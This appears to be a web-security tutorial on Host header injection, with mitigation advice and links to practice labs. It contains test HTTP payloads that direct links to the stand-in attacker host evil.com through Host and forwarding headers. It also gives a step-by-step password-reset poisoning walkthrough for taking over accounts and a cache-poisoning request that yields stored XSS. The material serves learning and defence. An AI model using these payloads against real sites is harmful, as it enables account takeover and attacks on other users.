# What is Host Header Injection?

Host Header Injection abuses apps that trust the incoming `Host` header and reflect it into responses, links, or logic. Since the client fully controls that header, an attacker can poison password-reset links, mess with caches, or reach internal virtual hosts. The classic high-impact case is account takeover through a poisoned reset email.

## How it works

- The app builds absolute URLs (reset links, redirects) from the `Host` header
- Or it makes a routing/access decision based on `Host`
- An attacker sets `Host: evil.com` and the app uses it as trusted input

## Test payloads

```http
# 1. Point the app at an attacker domain
GET /reset-password HTTP/1.1
Host: evil.com

# 2. Override via X-Forwarded-Host (very common)
GET / HTTP/1.1
Host: target.tld
X-Forwarded-Host: evil.com

# 3. Duplicate Host headers - servers may honour the 2nd
GET / HTTP/1.1
Host: target.tld
Host: evil.com

# 4. Host + port / absolute URL in request line
Host: target.tld:evil.com
GET https://target.tld/ HTTP/1.1
Host: evil.com

# 5. Other routing headers to try
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
```

## Full walkthrough - password reset poisoning (account takeover)

1. Request a password reset for the **victim's** email on the real site.
2. In the reset request, set `Host: evil.com` (or `X-Forwarded-Host: evil.com`).
3. The app builds the reset link from the Host header: `https://evil.com/reset?token=SECRET`.
4. The victim receives the email and clicks the link (or your server just logs the token when their mail client pre-fetches it).
5. Your server captures the reset **token** -> you reset the victim's password. Takeover.

## Web cache poisoning via Host

If the Host is reflected and the response is cached, poison it for all users:

```http
GET / HTTP/1.1
Host: target.tld
X-Forwarded-Host: evil.com   # reflected into a <script src> -> stored XSS for everyone
```

Use [Param Miner](https://github.com/PortSwigger/param-miner) to find unkeyed headers that reach the cache.

## Tools

- [Burp Suite](https://portswigger.net/burp) - edit the Host header freely in Repeater
- [Param Miner](https://github.com/PortSwigger/param-miner) - discover header-based cache poisoning

## Mitigation - the fix

- **Validate `Host`** against an allowlist of expected domains; reject anything else.
- Build absolute URLs (reset links, redirects) from **server-side config**, not the request header.
- Ignore `X-Forwarded-Host` unless set by a trusted proxy you control.
- Configure a strict default virtual host so unknown hosts get a 400.

## Practice

- [PortSwigger Host header attack labs](https://portswigger.net/web-security/host-header)

## Deep dive

- [Host Header Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger Host header attacks](https://portswigger.net/web-security/host-header)

## CWE

- CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax
- CWE-20: Improper Input Validation
